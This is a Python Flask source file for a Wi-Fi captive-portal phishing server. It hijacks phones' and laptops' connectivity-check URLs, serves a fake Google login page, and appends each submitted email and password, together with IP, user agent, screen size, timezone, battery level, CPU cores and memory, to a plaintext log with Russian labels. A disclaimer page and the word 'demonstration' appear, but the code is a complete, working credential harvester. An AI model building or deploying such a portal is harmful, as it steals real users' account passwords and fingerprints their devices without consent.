from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)

LOG_FILE = 'captured.txt'

@app.route('/')
def disclaimer():
    return render_template('disclaimer.html')

@app.route('/google')
def google():
    return render_template('google.html')

@app.route('/generate_204')
def generate_204():
    return redirect('/')

@app.route('/hotspot-detect.html')
def hotspot_detect():
    return redirect('/')

@app.route('/redirect')
def redirect_msft():
    return redirect('/')

@app.route('/log', methods=['POST'])
def log():
    email = request.form.get('email', '')
    password = request.form.get('password', '')

    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    lang = request.headers.get('Accept-Language', '')
    referer = request.headers.get('Referer', '')
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    screen = request.form.get('screen', '')
    platform = request.form.get('platform', '')
    timezone = request.form.get('timezone', '')
    battery = request.form.get('battery', '')
    cores = request.form.get('cores', '')
    memory = request.form.get('memory', '')
    touch = request.form.get('touch', '')
    language = request.form.get('language', '')

    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{ts}]\n")
        f.write(f"  IP: {ip}\n")
        f.write(f"  Email: {email}\n")
        f.write(f"  Пароль: {password}\n")
        f.write(f"  User-Agent: {ua}\n")
        f.write(f"  Язык (HTTP): {lang}\n")
        f.write(f"  Язык (JS): {language}\n")
        f.write(f"  Referer: {referer}\n")
        f.write(f"  Экран: {screen}\n")
        f.write(f"  Платформа: {platform}\n")
        f.write(f"  Часовой пояс: {timezone}\n")
        f.write(f"  Батарея: {battery}\n")
        f.write(f"  Ядер CPU: {cores}\n")
        f.write(f"  Память: {memory}\n")
        f.write(f"  Сенсорный экран: {touch}\n")
        f.write("-" * 50 + "\n")

    return '''
    <html>
    <head><meta charset="UTF-8"><title>Вход</title></head>
    <body style="font-family: Arial; text-align: center; padding: 100px;">
        <h1>Проверка данных...</h1>
        <p>Это демонстрация. Данные записаны в лог.</p>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
